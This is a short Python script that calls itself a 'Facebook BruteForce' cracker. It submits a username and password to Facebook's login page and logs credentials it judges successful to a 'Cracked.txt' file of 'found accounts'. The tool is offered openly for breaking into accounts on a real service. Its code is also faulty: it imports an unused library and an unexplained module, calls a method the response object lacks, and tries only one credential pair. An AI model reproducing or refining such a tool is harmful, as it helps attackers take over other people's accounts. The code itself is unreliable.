import mechanize
import requests as r
import sys
import os
from time import sleep
from i.t import *


abcd()
url= ('https://www.facebook.com/login.php')
try:
 r.get(url)
except:
 os.system('clear')
 print ('\n\n')
 print (' \n\033[31m[!]------------CHECK YOUR INTERNET CONNECTION-----------[!]\033[0m\n')
 print ('\n\n')
 sleep(1)
 sys.exit()
print ('''
\033[31m
 =================
 ||||
 ||||
 ||||
 |||| =========
 ||||            cracker
 ||||
 ||||      \033[92mv 1.0\033[0m
\033[31m ||||

\n---------- Welcome To Facebook BruteForce ----------\n
\033[0m
''')

un = input('\033[33m\nenter username\n: \033[32m')
ps = input('\033[33m\nenter password\n: \033[32m')
url= 'https://www.facebook.com/login.php'
ch = 'https://m.facebook.com/'
try:
 # the get method opens the url.
 r.get(url)
 payload = {
	 'username' : un,
 	 'password' : ps
 }
 # the post method help to send data
 # to the opened url.
 x=r.post(url , data=payload)
 print (x.geturl())
 if ch == x.geturl():
  print ('successful')
  with open('Cracked.txt','a') as f:
           # this  command saves the found accounts.
           f.write(f'username = {un}\npassword = {ps}\n')
           f.close()
 else:
   print ('failed')
except:
 print ('\n\033[92m[!]\033[0m CONNECTION ERROR')
 print ('\033[92m[!]\033[0m CHECK IF YOU ARE CONNECTED TO THE INTERNET')
 exit()
